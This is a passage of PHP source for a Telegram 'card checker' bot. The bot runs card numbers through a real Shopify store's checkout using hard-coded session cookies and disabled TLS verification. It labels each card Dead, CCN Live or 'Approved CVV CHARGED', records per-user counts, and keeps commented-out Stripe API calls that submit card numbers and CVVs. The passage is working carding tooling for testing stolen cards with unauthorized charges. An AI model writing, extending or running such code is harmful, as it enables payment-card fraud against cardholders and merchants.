checkout_session_token__co__beae0ba91ece337c9720ac1acf0780d8=%7B%22token%22%3A%22R0NYZGRWZ0o0dVFCSzZaTWVGdEl5MHFZT1JEVHJMUUd4VnF2djlEMDJ0OUJDQ2dWSVIxMVFoMWVuM3p5OVpocHVTY3ZRM1Y4ODNZNkhIRWdGSmFJT1I2RVdNYU92Z3djMTJNYTRHNEdGSWRxOElYSkxCS0kzaXY4c3dPeGNMYWEvaHVoc2RYMWJlRjlLZE1ZVmZkaldNOHFXNm9WczZySWpQN1FBa2tKdkNoSmhicTVNQ2RDcUZCMGRlQUhlMXk4OVRGcTBYY3BFamNndmhlNFhlU3RtZ1M4Vk5tREo4RTAzRHlRMnoxbHF4YmNDYWZNT1oyd1pmQzZvdDNIc3A4YS0tZ0Q3UzZKMnBLS09sZTlpMy0tTGMzOTlMNkdCUU9lNGszcW5pY3lBdz09%22%2C%22locale%22%3A%22en-US%22%7D; checkout_session_lookup=%7B%22version%22%3A1%2C%22keys%22%3A%5B%7B%22source_id%22%3A%2203e652e77fde07610aa8bb4fbc05cd18%22%2C%22checkout_session_identifier%22%3A%22beae0ba91ece337c9720ac1acf0780d8%22%2C%22source_type_abbrev%22%3A%22c%22%2C%22updated_at%22%3A%222022-11-26T08%3A19%3A54.843Z%22%7D%2C%7B%22source_id%22%3A%22beae0ba91ece337c9720ac1acf0780d8%22%2C%22checkout_session_identifier%22%3A%22beae0ba91ece337c9720ac1acf0780d8%22%2C%22source_type_abbrev%22%3A%22co%22%2C%22updated_at%22%3A%222022-11-26T08%3A26%3A26.053Z%22%7D%5D%7D; _s=68796590-db12-4691-9411-12c47c44e228; _shopify_s=68796590-db12-4691-9411-12c47c44e228; _shopify_sa_p=; unique_interaction_id=c66e269c-3720-40d2-34c6-d93e7e030241; _checkout_queue_token=AkZKc2lVHk6HFozXEz0M_jNM51-D8wLCr2V0ONsPyCvy2-1KTpt_fkc1UqNneXEQjT6khq6o-2eYVnBzLJtF53rjt_GmAQZ_MbATLYYVGdM0yfo_goXR02IyvpAM2_QdRJtobPb_nzeEbfM__cFSZv7tktJwDqWYkOrkkkEcJXU7kXxFjt-DoDyfdQI%3D; _checkout_queue_checkout_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVZpWldGbE1HSmhPVEZsWTJVek16ZGpPVGN5TUdGak1XRmpaakEzT0RCa09BWTZCa1ZVIiwiZXhwIjoiMjAyMi0xMS0yNlQxMDoyMDo0NS45MTVaIiwicHVyIjoiY29va2llLl9jaGVja291dF9xdWV1ZV9jaGVja291dF90b2tlbiJ9fQ%3D%3D--007437fdc8db4ac20c3eeebfb837c289c6dd8a28; _shopify_sa_t=2022-11-26T09%3A20%3A46.920Z; _gat=1';
                $headers[] = 'referer: https://shoptheweitzman.org/';
                $headers[] = 'path: /57165742237/checkouts/'.$trans[0].'/processing?from_processing_page=1';
                $headers[] = 'Connection: keep-alive';
                $headers[] = 'Upgrade-Insecure-Requests: 1';
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie'.$XeroSploitJef.'.txt');
                curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie'.$XeroSploitJef.'.txt');
                $result5 = curl_exec($ch);
                echo "\nPASO5:".$result5;
                $msj = trim(strip_tags(getStrss($result5,'class="notice__content"><p class="notice__text">','</p></div></div>')));
                echo "\nPASO5:".$msj;
                $MADEBY = "eljose";


                // $ch = curl_init();
                // curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
                // curl_setopt($sh, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                // curl_setopt($ch, CURLOPT_HEADER, 0);
                // curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
                // curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                // 'content-type: application/x-www-form-urlencoded',));
                // curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                // curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                // curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                // curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                // curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
                // curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
                // curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=Aju Bose&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mon.'&card[exp_year]='.$year);
                // $result = curl_exec($ch);
                $info = curl_getinfo($ch);
                $time = $info['total_time'];
                $time = substr_replace($time, '',4);
                curl_close($ch);
                $delay00 = microtimeFormat($starttime);
                if((strpos($result2, 'card was declined')) || (strpos($result2, "generic_decline")) || (strpos($result2, 'do_not_honor')) || (strpos($result1, "generic_decline")) || (strpos($result2, "processing_error")) || (strpos($result2, "parameter_invalid_empty")) || (strpos($result2, 'lock_timeout')) || (strpos($result2, "transaction_not_allowed"))){
                    // $stripemessage = capture($result,'"code": "','"');
                    bot('editMessageText',[
                        'chat_id'=>$chat_id,
                        'message_id'=>$messageidtoedit,
                        'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -» Dead ❌
Response -» <code>$msj</code>
Gateway -» Shopify Auth 1
Time -» <b>$delay00</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $scheme
<b>Type -»</b> $type
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>
Proxy [ IP: $ip]
<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>",
                        'parse_mode'=>'html',
                        'disable_web_page_preview'=>'false'
                        
                    ]);
                    return;
    
                }
                elseif ((strpos($result5, 'Your order is confirmed')) || (strpos($result5, "succeeded")) || (strpos($result5, 'Thank_you')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "incorrect_zip")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
                    addTotal();
                    addUserTotal($userId);
                    addCCN();
                    addUserCCN($userId);
                    addCVV();
                    addUserCVV($userId);
                    bot('editMessageText',[
                        'chat_id'=>$chat_id,
                        'message_id'=>$messageidtoedit,
                        'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -» Approved CVV CHARGED 5$ ✅
Response -» $msj
Gateway -» Shopify Gateway
Time -» <b>$delay00</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $scheme
<b>Type -»</b> $type
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>
Proxy [ IP: $ip]
<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>",
                        'parse_mode'=>'html',
                        'disable_web_page_preview'=>'false'
                        
                    ]);
                }
                elseif((strpos($result5, 'Security code was not matched by the processor')) || (strpos($msj, "Security code was not matched by the processor")) || (strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc"))){
                    addTotal();
                    addUserTotal($userId);
        
                    bot('editMessageText',[
                        'chat_id'=>$chat_id,
                        'message_id'=>$messageidtoedit,
                        'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -» SHOPIFY CCN Live ✅#CCN
Response -» <code>$msj</code>
Gateway -» Shopify Auth 1
Time -» <b>$delay00</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $scheme
<b>Type -»</b> $type
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>
Proxy [ IP: $ip]
<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>",
                        'parse_mode'=>'html',
                        'disable_web_page_preview'=>'false'
                        
                    ]);
                }
                elseif(empty($msj)){
                    bot('editMessageText',[
                        'chat_id'=>$chat_id,
                        'message_id'=>$messageidtoedit,
                        'text'=>"<b>😭REINTENTAR ➜ Dead Proxy/Error Not listed/CC Checker Dead.</b>",
                        'parse_mode'=>'html',
                        'disable_web_page_preview'=>'true'
                    ]);
                    
                    file_put_contents("resultad.txt",$result5);
                }
                elseif(strpos($result5,"There was a problem processing the payment")){
                    bot('editMessageText',[
                        'chat_id'=>$chat_id,
                        'message_id'=>$messageidtoedit,
                        'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -» Dead ❌
Response -» <code>$msj</code>
Gateway -» Shopify Auth 1
Time -» <b>$delay00</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $scheme
<b>Type -»</b> $type
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>
Proxy [ IP: $ip]
<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>",
                        'parse_mode'=>'html',
                        'disable_web_page_preview'=>'false'
                        
                    ]);
                    
                    file_put_contents("resultadOtro.txt",$result5);
                }
                else{
                    bot('editMessageText',[
                        'chat_id'=>$chat_id,
                        'message_id'=>$messageidtoedit,
                        'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -» Reintentar Error ⚠️
Response -» <code>$msj</code>
Gateway -» Shopify Auth 1
Time -» <b>$delay00</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $scheme
<b>Type -»</b> $type
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>
Proxy [ IP: $ip]
<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Z_tJKkeZQoZlcssuXjVjNerQ'>Eljose</a></b>",
                        'parse_mode'=>'html',
                        'disable_web_page_preview'=>'false'
                        
                    ]);
                    file_put_contents("resultELSE.txt",$result5);
                }
                
                // $id = capture($result,'"id": "','"');
                
                // $ch = curl_init();
                // curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
                // curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                // curl_setopt($ch, CURLOPT_HEADER, 0);
                // curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
                // curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                // 'content-type: application/x-www-form-urlencoded',));
                // curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                // curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                // curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                // curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                // curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
                // curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
                // curl_setopt($ch, CURLOPT_POSTFIELDS, 'description=Aju Bose&source='.$id);
                // $result1 = curl_exec($ch);
                // $info = curl_getinfo($ch);
                // $time = $info['total_time'];
                // $time = substr_replace($time, '',4);
                
                ###END OF CHECKER PART###
                // if (array_in_string($result1, $live_array)) {
                //     $stripemessage = trim(strip_tags(capture($result1,'"message": "','"')));
                //     $live = True;
                // }elseif(strpos($result1, '"cvc_check": "unavailable"')){
                //     $stripemessage = 'CVC Check Unavailable';
                //     $live = False;
                // }else{
                //     $stripemessage = capture($result1,'"decline_code": "','"');
                //     if(empty($stripemessage)){
                //         $stripemessage = $result1;
                //     }
                //     $live = False;
                // }
                
              
            }else{
                bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>TARJETA NO VALIDA!😦</b>",
                    'parse_mode'=>'html',
                    'disable_web_page_preview'=>'true'
                    
                ]);
            }
        }
    }
?>